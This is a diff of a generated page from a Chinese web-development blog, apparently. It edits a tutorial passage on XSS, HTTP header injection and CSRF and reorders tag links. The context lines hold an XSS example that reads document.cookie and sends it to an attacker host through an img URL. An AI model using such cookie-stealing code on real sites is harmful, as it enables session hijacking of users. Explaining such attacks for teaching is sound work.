@@ -339,7 +339,7 @@
        <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var content = escape(document.cookie);</div><div class="line">document.write(<span class="string">'&lt;img src = http://hackr.js/?&gt;'</span>);</div><div class="line">document.write(content);</div><div class="line">document.write(<span class="string">'&gt;'</span>);</div></pre></td></tr></table></figure>
 
       在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中
-</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新。</p>
+</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击(CSRF)是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新,就是说用户在已登录的情况下访问了危险网站，这时候危险网站就能获取你的cookie，截取你的登陆信息获得你的登陆权限，从而做一些不好的事情。</p>
 
       
 
@@ -986,11 +986,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">jquery</a>
+                <a href="javascript:void(0)" class="js-tag color2">Jquery</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Jquery</a>
+                <a href="javascript:void(0)" class="js-tag color2">jquery</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1002,11 +1002,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">es6 箭头函数</a>
+                <a href="javascript:void(0)" class="js-tag color3">http 缓存</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">http 缓存</a>
+                <a href="javascript:void(0)" class="js-tag color4">es6 箭头函数</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1014,19 +1014,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">node.js MongoDB</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">js 算法</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">算法  动态规划</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">es6 模块化</a>
+                <a href="javascript:void(0)" class="js-tag color1">node.js MongoDB</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1034,7 +1026,15 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">es6 模块化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">js 笔试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">算法  动态规划</a>
               </li>
              
               <li class="article-tag-list-item">
